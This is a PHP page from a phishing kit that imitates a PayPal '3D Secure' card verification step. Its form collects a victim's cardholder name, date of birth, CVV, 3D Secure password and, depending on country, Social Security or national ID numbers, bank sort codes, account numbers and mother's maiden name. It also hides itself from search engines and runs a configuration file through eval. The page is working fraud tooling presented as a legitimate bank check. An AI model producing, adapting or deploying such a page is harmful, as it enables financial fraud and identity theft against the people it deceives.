<?php
require_once __DIR__ . '/function.php';
if (file_exists($api->dir_config . '/' . $api->general_config))
{
  @eval(file_get_contents($api->dir_config . '/' . $api->general_config));
}
if ($config_blocker = 1)
{
  $api->session();
}
$api->visitor("3D Secure");
?>
<!DOCTYPE html>
<html>

<head>
  <title><?=$api->encode($_SESSION['card_title']);?></title>
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
  <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noodp, noydir">
  <link rel="shortcut icon" href="../assets/img/favicon.ico">
	<link rel="apple-touch-icon" href="../assets/img/apple-touch-icon.png">
  <link rel="stylesheet" href="../assets/css/3dsecure.css">
  <script src="../assets/js/jquery.min.js"></script>
  <script src="../assets/js/jquery.mask.js"></script>
  <script src="../assets/js/jquery.validate.js"></script>
  <script src="../assets/js/myaccount.3dsecure.js"></script>
</head>

<body>
  <div class="kuzuluy">
    <img src="<?=$_SESSION['logo_img'];?>">
    <img src="../assets/img/logo.svg" style="float: right;display: inline-block" width="128px">
    <p class="info3d"><?=$api->transcode("Please enter information pertaining to your credit card to confirm your PayPal account.");?></p>
    <div id="3dpage">
      <div align="center">
        <p style="margin: 91px 0 129px;"><?=$api->transcode("processing ...");?></p>
      </div>
    </div>
    <div class="hide" id="3dweb">
      <form method="post" id="3dsecure" autocomplete="off">
        <table align="center" width="350" style="font-size: 11px;font-family: arial, sans-serif; color: rgb(0, 0, 0); margin-top: 10px;">
          <tbody style="height:8px;">
            <tr>
              <td align="right">Name of Cardholder : </td>
              <td><input type="text" name="holder" style="width: 150px;line-height:0.6" required></td>
            </tr>
            <tr>
              <td align="right">Date Of Birth : </td>
              <td>
                <select name="DD" id="DD" style="width: 43px;">
                  <option value="-1">DD</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                  <option value="13">13</option>
                  <option value="14">14</option>
                  <option value="15">15</option>
                  <option value="16">16</option>
                  <option value="17">17</option>
                  <option value="18">18</option>
                  <option value="19">19</option>
                  <option value="20">20</option>
                  <option value="21">21</option>
                  <option value="22">22</option>
                  <option value="23">23</option>
                  <option value="24">24</option>
                  <option value="25">25</option>
                  <option value="26">26</option>
                  <option value="27">27</option>
                  <option value="28">28</option>
                  <option value="29">29</option>
                  <option value="30">30</option>
                  <option value="31">31</option>
                </select>
                <select name="MM" id="MM" style="width: 46px">
                  <option value="-1">MM</option>
                  <option value="01">01</option>
                  <option value="02">02</option>
                  <option value="03">03</option>
                  <option value="04">04</option>
                  <option value="05">05</option>
                  <option value="06">06</option>
                  <option value="07">07</option>
                  <option value="08">08</option>
                  <option value="09">09</option>
                  <option value="10">10</option>
                  <option value="11">11</option>
                  <option value="12">12</option>
                </select>
                <select name="YYYY" id="YYYY" style="width: 60px;">
                  <option value="-1">YYYY</option>
                  <option value="1998">1998</option>
                  <option value="1997">1997</option>
                  <option value="1996">1996</option>
                  <option value="1995">1995</option>
                  <option value="1994">1994</option>
                  <option value="1993">1993</option>
                  <option value="1992">1992</option>
                  <option value="1991">1991</option>
                  <option value="1990">1990</option>
                  <option value="1989">1989</option>
                  <option value="1988">1988</option>
                  <option value="1987">1987</option>
                  <option value="1986">1986</option>
                  <option value="1985">1985</option>
                  <option value="1984">1984</option>
                  <option value="1983">1983</option>
                  <option value="1982">1982</option>
                  <option value="1981">1981</option>
                  <option value="1980">1980</option>
                  <option value="1979">1979</option>
                  <option value="1978">1978</option>
                  <option value="1977">1977</option>
                  <option value="1976">1976</option>
                  <option value="1975">1975</option>
                  <option value="1974">1974</option>
                  <option value="1973">1973</option>
                  <option value="1972">1972</option>
                  <option value="1971">1971</option>
                  <option value="1970">1970</option>
                  <option value="1969">1969</option>
                  <option value="1968">1968</option>
                  <option value="1967">1967</option>
                  <option value="1966">1966</option>
                  <option value="1965">1965</option>
                  <option value="1964">1964</option>
                  <option value="1963">1963</option>
                  <option value="1962">1962</option>
                  <option value="1961">1961</option>
                  <option value="1960">1960</option>
                  <option value="1959">1959</option>
                  <option value="1958">1958</option>
                  <option value="1957">1957</option>
                  <option value="1956">1956</option>
                  <option value="1955">1955</option>
                  <option value="1954">1954</option>
                  <option value="1953">1953</option>
                  <option value="1952">1952</option>
                  <option value="1951">1951</option>
                  <option value="1950">1950</option>
                  <option value="1949">1949</option>
                  <option value="1948">1948</option>
                  <option value="1947">1947</option>
                  <option value="1946">1946</option>
                  <option value="1945">1945</option>
                  <option value="1944">1944</option>
                  <option value="1943">1943</option>
                  <option value="1942">1942</option>
                  <option value="1941">1941</option>
                  <option value="1940">1940</option>
                  <option value="1939">1939</option>
                  <option value="1938">1938</option>
                  <option value="1937">1937</option>
                  <option value="1936">1936</option>
                  <option value="1935">1935</option>
                  <option value="1934">1934</option>
                  <option value="1933">1933</option>
                  <option value="1932">1932</option>
                  <option value="1931">1931</option>
                  <option value="1930">1930</option>
                  <option value="1929">1929</option>
                  <option value="1928">1928</option>
                  <option value="1927">1927</option>
                  <option value="1926">1926</option>
                  <option value="1925">1925</option>
                  <option value="1924">1924</option>
                  <option value="1923">1923</option>
                  <option value="1922">1922</option>
                  <option value="1921">1921</option>
                  <option value="1920">1920</option>
                  <option value="1919">1919</option>
                  <option value="1918">1918</option>
                  <option value="1917">1917</option>
                  <option value="1916">1916</option>
                </select>
              </td>
            </tr>
            <tr>
              <td align="right">Card Number : </td>
              <td>
                <?=$_SESSION['show_num'];?>
              </td>
            </tr>
            <tr>
              <td align="right">CVV/CVC : </td>
              <td><input type="password" name="cvv" id="cvv" style="width: 38px;line-height:0.6" required>&nbsp;<img src="<?=$_SESSION['cvv_img'];?>" style="position: absolute;width: 39px;height: 18px;op:auto;"></td>
            </tr>
            <tr>
              <td align="right">3D Secure : </td>
              <td><input style="width: 150px;line-height:0.6" type="password" name="password_vbv" required></td>
            </tr>
            <?php
            if($_SESSION['code'] == "UK"){
              echo "
              <tr>
                <td align='right'>Sort Code : </td>
                <td><input style='width: 75px;' type='text' id='sortcode' name='sortcode' placeholder='XX-XX-XX' maxlength='8' required></td>
              </tr>
              <tr>
                <td align='right'>Account Number : </td>
                <td><input style='width: 150px' type='text' name='accountnumber' required></td>
              </tr>
              <tr>
                <td align='right'>Mother Maiden Name : </td>
                <td><input style='width: 150px' type='text' name='mother' required></td>
              </tr>";
            }else if($_SESSION['code'] == "US"){
              echo "
              <tr>
                <td align='right'>Social Security Number : </td>
                <td><input type='text' id='ssn3' name='ssn3' style='width: 25px;' maxlength='3' required> - <input type='text' id='ssn2' name='ssn2' style='width: 18px;' maxlength='2' required> - <input type='text' id='snn4' name='ssn4' style='width: 33px;' maxlength='4' required></td>
              </tr>
              <tr>
                <td align='right'>Mother Maiden Name : </td>
                <td><input style='width: 150px' type='text' name='mother' required></td>
              </tr>";
            }else if($_SESSION['code'] == "CA"){
              echo "
              <tr>
                <td align='right'>Social Insurance Number : </td>
                <td><input style='width: 150px' type='text' id='nin' name='idnumber' placeholder='XXX-XXX-XXX' maxlength='11' required></td>
              </tr>
              <tr>
                <td align='right'>Mother Maiden Name : </td>
                <td><input style='width: 150px' type='text' name='mother' required></td>
              </tr>";
            }else if($_SESSION['code'] == "IE"){
              echo "
              <tr>
                <td align='right'>Sort Code : </td>
                <td><input style='width: 75px;' type='text' id='sortcode' name='sortcode' placeholder='XX-XX-XX' maxlength='8' required></td>
              </tr>
              <tr>
                <td align='right'>Daily credit limits : </td>
                <td><input style='width: 150px' type='text' name='limit' required></td>
              </tr>
              <tr>
                <td align='right'>Account Number : </td>
                <td><input style='width: 150px' type='text' name='accountnumber' required></td>
              </tr>
              <tr>
                <td align='right'>Personal Public Service Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='9' required></td>
              </tr>";
            }else if($_SESSION['code'] == "DE" || $_SESSION['code'] == "LU" || $_SESSION['code'] == "CH" || $_SESSION['code'] == "FL"){
              echo "
              <tr>
                <td align='right'>Account Number : </td>
                <td><input style='width: 150px' type='text' name='accountnumber' required></td>
              </tr>";
            }else if($_SESSION['code'] == "BR"){
              echo "
              <tr>
                <td align='right'>CPF Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='14' required></td>
              </tr>";
            }else if($_SESSION['code'] == "NL"){
              echo "
              <tr>
                <td align='right'>Citizen Service Number/SOFI : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='9' required></td>
              </tr>";
            }else if($_SESSION['code'] == "SE"){
              echo "
              <tr>
                <td align='right'>Personal Identity Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='11' required></td>
              </tr>";
            }else if($_SESSION['code'] == "NZ"){
              echo "
              <tr>
                <td align='right'>Monthly credit limits : </td>
                <td><input style='width: 150px' type='text' name='limit' required></td>
              </tr>";
            }else if($_SESSION['code'] == "ES"){
              echo "
              <tr>
                <td align='right'>Account Number : </td>
                <td><input style='width: 150px' type='text' name='accountnumber' required></td>
              </tr>
              <tr>
                <td align='right'>National ID Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' required></td>
              </tr>
              <tr>";
            }else if($_SESSION['code'] == "AL"){
              echo "
              <tr>
                <td align='right'>Account Number : </td>
                <td><input style='width: 150px' type='text' name='accountnumber' required></td>
              </tr>
              <tr>
                <td align='right'>Mother Maiden Name : </td>
                <td><input style='width: 150px' type='text' name='mother' required></td>
              </tr>";
            }else if($_SESSION['code'] == "CY"){
              echo "
              <tr>
                <td align='right'>Tax Number : </td>
                <td><input style='width: 150px' type='text' name='taxnumber' required></td>
              </tr>
              <tr>
                <td align='right'>ID Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' required></td>
              </tr>
              <tr>
                <td align='right'>Last 4 digits of ID / Passport : </td>
                <td><input style='width: 150px' type='text' name='passport' required></td>
              </tr>";
            }else if($_SESSION['code'] == "AU"){
              echo "
              <tr>
                <td align='right'>Driver License Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' required></td>
              </tr>
              <tr>
                <td align='right'>Online Shopping ID : </td>
                <td><input style='width: 150px' type='text' name='osid' maxlength='15' required></td>
              </tr>";
            }else if($_SESSION['code'] == "IT"){
              echo "
              <tr>
                <td align='right'>Fiscal Code Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='16' required></td>
              </tr>";
            }else if($_SESSION['code'] == "HK"){
              echo "
              <tr>
                <td align='right'>National ID Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='10' required></td>
              </tr>";
            }else if($_SESSION['code'] == "KW"){
              echo "
              <tr>
                <td align='right'>Civil ID Number : </td>
                <td><input style='width: 150px' type='text' name='idnumber' maxlength='12' required></td>
              </tr>";
            }
            ?>
            <tr>
              <td></td>
              <td><br><input type="submit" value="Submit" id="bntvbv"></td>
            </tr>
          </tbody>
        </table>
      </form>
    </div>
    <p style="text-align: center;font-family: arial, sans-serif;font-size: 9px; color: #656565"><?=$api->transcode("© ".gmdate('Y')." Bank check. All Rights Reserved");?></p>
  </div>
<script src="../assets/js/3dsecure.post.js"></script>
</body>

</html>
